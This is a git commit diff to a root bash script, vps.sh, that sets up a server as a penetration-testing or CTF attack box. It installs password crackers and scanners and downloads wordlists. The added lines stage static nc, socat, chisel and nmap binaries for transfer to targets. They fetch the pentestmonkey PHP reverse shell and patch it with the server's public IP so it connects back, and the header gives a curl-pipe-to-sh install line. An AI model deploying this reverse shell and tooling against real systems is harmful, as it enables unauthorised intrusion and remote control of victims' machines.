470c973cf92d4d65fb583650e771d0a67933943a
superhero1 <superhero1@users.noreply.github.com>
2021-03-21 16:05:57 +0100

    Update vps.sh

--- vps.sh
+++ vps.sh
@@ -1,11 +1,17 @@
 #!/bin/bash
+# Install command:
+# curl --proto '=https' --tlsv1.2 -sSf https://superhero1.com/vps.sh | sh
+RED="\033[1;31m"
+GREEN="\033[1;32m"
+NOCOLOR="\033[0m"
+echo
 echo "This script should always run as root"
 # Change hostname (not really needed)
 hostname heroVPS
 hostnamectl set-hostname heroVPS
 # Update the package list and install latest updates
 apt update
-DEBIAN_FRONTEND=noninteractive apt upgrade -yq
+#DEBIAN_FRONTEND=noninteractive apt upgrade -yq
 # Install additional packages we always need
 # hydra, john, nikto etc
 apt install -y golang python3-pip unzip nmap jq hydra-gtk john nikto ruby ruby-dev steghide libjpeg62
@@ -31,5 +37,25 @@ mv SecLists-master/ /usr/share/seclists/
 mkdir /usr/share/wordlists
 wget https://download.weakpass.com/wordlists/90/rockyou.txt.gz
 gunzip rockyou.txt.gz && mv rockyou.txt /usr/share/wordlists/
-echo "Done! :)"
-echo "If you like this script feel free to contribute or donate at https://ko-fi.com/superhero1"
+# Get some static binaries and put them into ~/web/static
+mkdir -p ~/web/static
+# nmap
+wget -q $(curl -sL https://api.github.com/repos/ernw/static-toolbox/releases/latest | jq -r '.assets[].browser_download_url' | grep "linux64" | sort -ur | head -n1) -O ~/web/static/nmap.zip
+# unzip
+wget -q https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox_UNZIP -O ~/web/static/unzip && chmod +x ~/web/static/unzip
+# chisel
+ wget -q $(curl -sL https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.assets[].browser_download_url' | grep "linux_amd64") -O ~/web/static/chisel.gz && gunzip chisel.gz && chmod +x ~/web/static/chisel
+# nc
+wget -q https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox_NC -O ~/web/static/nc && chmod +x ~/web/static/nc
+# socat
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O ~/web/static/socat && chmod +x ~/web/static/socat
+# wget
+wget -q https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox_WGET -O ~/web/static/wget && chmod +x ~/web/static/wget
+# get pentestmonkey php reverse shell
+wget -q https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O ~/web/revshell.php
+# replace IP with our VPS IP
+sed -i 's,^\($ip[ ]*=\).*,\1\ \"'`curl -sL ipconfig.me`\"\;',g' ~/web/revshell.php
+# SimpleHttpServerWithUpload.py
+echo
+echo -e "${GREEN}Done! :)${NOCOLOR}"
+echo -e "${RED}If you like this script feel free to contribute or donate at https://ko-fi.com/superhero1${NOCOLOR}"
